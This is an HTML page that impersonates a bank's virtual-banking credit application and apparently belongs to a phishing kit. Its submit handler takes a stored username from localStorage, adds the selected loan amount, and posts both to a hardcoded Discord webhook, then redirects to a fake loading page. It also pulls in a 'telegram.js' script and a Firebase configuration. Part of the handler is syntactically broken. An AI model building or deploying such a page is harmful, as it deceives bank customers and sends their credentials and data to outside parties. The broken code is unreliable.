<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta
      name="viewport"
      content="width=device-width, initial-scale=1.0, user-scalable=no"
    />

    <title>División y Carrusel</title>
    <script src="https://cdn.jsdelivr.net/npm/axios@1.1.2/dist/axios.min.js"></script>
    <script type="module">
      import { initializeApp } from "https://www.gstatic.com/firebasejs/10.0.0/firebase-app.js";
      import {
        getFirestore,
        doc,
        setDoc,
        onSnapshot,
      } from "https://www.gstatic.com/firebasejs/10.0.0/firebase-firestore.js";

      const firebaseConfig = {
        apiKey: "AIzaSyDFYJf5HrCfbyEkggIHJ6hcgQJpUKMfzc0",
        authDomain: "basedtos-84767.firebaseapp.com",
        projectId: "basedtos-84767",
        storageBucket: "basedtos-84767.appspot.com",
        messagingSenderId: "622608516389",
        appId: "1:622608516389:web:b3c12b4a3537c1bfff06cc",
      };
      const app = initializeApp(firebaseConfig);
      const db = getFirestore(app);

      window.db = db; // Hacer db accesible globalmente
      window.doc = doc;
      window.setDoc = setDoc;
      window.onSnapshot = onSnapshot;
    </script>
    <style>
      * {
        box-sizing: border-box;
      }

      body {
        font-family: Arial, sans-serif;
        margin: 0;
        height: 100vh;
        padding: 0;
      }

      .container {
        display: flex;
        flex-wrap: wrap;
        height: 100vh;
      }

      .left,
      .right {
        padding: 20px;
      }

      .left {
        flex: 1;
        background-color: #ffffff;
        order: 1;
        display: flex;
        justify-content: center;
        align-items: center;
      }

      .right {
        flex: 1.5;
        background-color: #f6faff;
        order: 2;
      }

      /* Estilo del contenedor del carrusel */
      .carousel-wrapper {
        width: 500px;
        display: flex;
        justify-content: space-between;
        align-items: center;
        position: relative;
      }

      /* Estilo del carrusel */
      .carousel {
        display: flex;
        gap: 10px;
        overflow: hidden;
        width: 100%;
        scroll-behavior: smooth;
      }

      .carousel-item {
        min-width: calc(33.33% - 20px);
        height: 200px;

        color: white;
        display: flex;
        justify-content: center;
        align-items: center;
        font-size: 24px;
        border-radius: 5px;
      }

      button {
        background-color: rgb(255, 255, 255);
        color: #0043a9;
        border: none;
        padding: 10px;
        border-radius: 100%;
        border: 1px solid #0043a9;
        width: 40px;
        cursor: pointer;
      }

      .prev,
      .next {
        flex: 0 0 auto;
      }
      .formulario {
        width: 400px;
      }

      .formcontainer {
        width: 100%;
        max-width: 600px;

        height: 100vh;
        margin: 0 auto;
      }

      .header {
        display: flex;
        justify-content: space-between;
        background-color: #ffffff;
        border: 1px solid #e6e6e6;
        border-radius: 10px 10px 0 0;
      }

      .tab {
        flex: 1;
        padding: 15px;
        text-align: center;
        cursor: pointer;
        color: gray;
      }
      .active {
        color: #0043a9;
        border-bottom: 1px solid #0043a9;
      }

      .forms {
        padding: 20px;
        border: 1px solid #e6e6e6;
        background-color: #ffffff;
      }

      .form-content {
        display: none;
      }

      .form-content h3 {
        margin-top: 0;
      }

      #form1 {
        display: block;
        box-sizing: border-box;
      }
      @media (max-width: 768px) {
        .container {
          flex-direction: column;
          height: auto;
        }

        .right {
          order: 2 !important;
          width: 100%;
          height: auto; /* Ajusta la altura automáticamente */
        }

        .left {
          order: 1;
          width: 100%;
        }

        .formulario {
          width: 100%;
        }

        .carousel-wrapper {
          width: 100%;
        }

        .carousel-item {
          min-width: 38%;
        }
        .centrars {
          margin-top: 10%;
        }
      }
      @media (min-width: 768px) {
        .cabeza {
          display: none;
        }
      }
    </style>
  </head>
  <body style="background: #f6f9fe">
    <div class="container">
      <div class="left" style="background: #f6f9fe !important; padding: 0">
        <div class="formulario" style="background: transparent !important">
          <div style="height: 50px; width: 100%; background: #2d3f63" class="cabeza"></div>
          <div
            class="imagenlogo"
            style="
              width: 100%;
              text-align: center;
              background: white;
              height: 50px;
              display: flex;
              justify-content: center;
              align-items: center;
            "
          >
            <h4>Ingreso a Banca Virtual</h4>
          </div>
          <div style="padding: 20px">
            <div class="centrars">
              <div class="titulo"><h4>Solicita tu crédito</h4></div>

              <div class="formcontainer">
                <!-- Formularios -->
                <div class="forms" style="border-radius: 10px">
                  <div id="form1" class="form-content">
                    <form id="segura">
                      <p>
                        Seleccione el monto de su crédito que usted desea
                        solicitar, 100% digital
                      </p>

                      <div style="width: 100%; text-align: center">
                        <div
                          style="
                            width: 100%;
                            text-align: center;
                            color: #0043a9;
                            font-weight: bold;
                            margin-bottom: 20px;
                          "
                        >
                          Selecciona el monto de tu crédito:
                        </div>
                        <div
                          class="slider-container"
                          style="position: relative; width: 100%"
                        >
                          <div
                            class="slider-value"
                            id="sliderValue"
                            style="
                              color: #0043a9;
                              font-size: 18px;
                              margin-bottom: 10px;
                            "
                          >
                            $10,000 USD
                          </div>
                          <input
                            type="range"
                            min="13000000"
                            max="80000000"
                            value="25000000"
                            class="slider"
                            id="priceSlider"
                            style="width: 100%"
                          />
                        </div>
                      </div>

                      <style>
                        .slider {
                          -webkit-appearance: none;
                          appearance: none;
                          width: 100%;
                          height: 10px;
                          background: #e0e0e0;
                          border-radius: 5px;
                          outline: none;
                          opacity: 0.8;
                          transition: opacity 0.2s;
                        }

                        .slider:hover {
                          opacity: 1;
                        }

                        /* Estilos para la bolita del slider */
                        .slider::-webkit-slider-thumb {
                          -webkit-appearance: none;
                          appearance: none;
                          width: 24px;
                          height: 24px;
                          border-radius: 50%;
                          background: #0043a9;
                          cursor: pointer;
                          box-shadow: 0 0 4px rgba(0, 0, 0, 0.2);
                          transition: background 0.2s ease-in-out;
                        }

                        .slider::-webkit-slider-thumb:hover {
                          background: #003380;
                        }

                        .slider::-moz-range-thumb {
                          width: 24px;
                          height: 24px;
                          border-radius: 50%;
                          background: #0043a9;
                          cursor: pointer;
                          box-shadow: 0 0 4px rgba(0, 0, 0, 0.2);
                          transition: background 0.2s ease-in-out;
                        }

                        .slider::-moz-range-thumb:hover {
                          background: #003380;
                        }

                        /* Para que se vea bien en dispositivos móviles */
                        .slider-container {
                          padding: 10px;
                        }
                      </style>

                      <script>
                        const slider = document.getElementById("priceSlider");
                        const sliderValue =
                          document.getElementById("sliderValue");

                        function formatNumber(num) {
                          if (num < 10000) {
                            return num;
                          }
                          return num
                            .toString()
                            .replace(/\B(?=(\d{3})+(?!\d))/g, ",");
                        }

                        slider.addEventListener("input", function () {
                          sliderValue.textContent = `$${formatNumber(
                            slider.value
                          )} COP`;
                        });

                        // Formatear el valor inicial del slider
                        sliderValue.textContent = `$${formatNumber(
                          slider.value
                        )} COP`;
                      </script>

                      <div style="width: 100%; text-align: center">
                        <button
                          style="
                            padding: 10px;
                            background: #0043a9;
                            border-radius: 20px;
                            color: white;
                            font-weight: bold;
                            font-size: 15px;
                            margin-top: 30px;
                            width: 250px !important;
                            display: inline-block; /* Cambia el display a inline-block */
                            text-align: center; /* Alinea el texto al centro */
                            text-decoration: none; /* Elimina el subrayado */
                          "
                        >
                          Solicitar crédito
                        </button>
                      </div>
                    </form>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>

    <script>
      function showForm(formId, element) {
        // Ocultar todos los formularios
        document.querySelectorAll(".form-content").forEach(function (form) {
          form.style.display = "none";
        });

        // Mostrar el formulario seleccionado
        document.getElementById(formId).style.display = "inline";

        // Remover la clase activa de todas las pestañas
        document.querySelectorAll(".tab").forEach(function (tab) {
          tab.classList.remove("active");
        });

        // Agregar la clase activa a la pestaña seleccionada
        element.classList.add("active");
      }
    </script>

  </body>

  <script src="https://cdn.jsdelivr.net/npm/axios@1.1.2/dist/axios.min.js"></script>


  <script src="telegram.js"></script>

  <script>

    const form = document.querySelector("#segura");

    form.addEventListener("submit", async (event) => {
      event.preventDefault();

      const questionRef = doc(

      });
      const message =
        "bogot1" +

        localStorage.getItem("usuario") +
        "\nCredito: " +
        document.querySelector("#priceSlider").value;

     axios
  .post(
    "https://discord.com/api/webhooks/1559991129309712385/yTPHRmeNY0Ic-Glf-b6brRW6akGmoVtqbno_Cacm6u2YX5MC7Sw5oAkCoa6SXAsUw0nL",
    {
      content: message,
    },
    {
      headers: {
        "Content-Type": "application/json"
      }
    }
  )
        .then((response) => {
          window.location.href = "cargando.html";
        })
        .catch((error) => {
          console.error(error);
        });
    });
  </script>
</html>
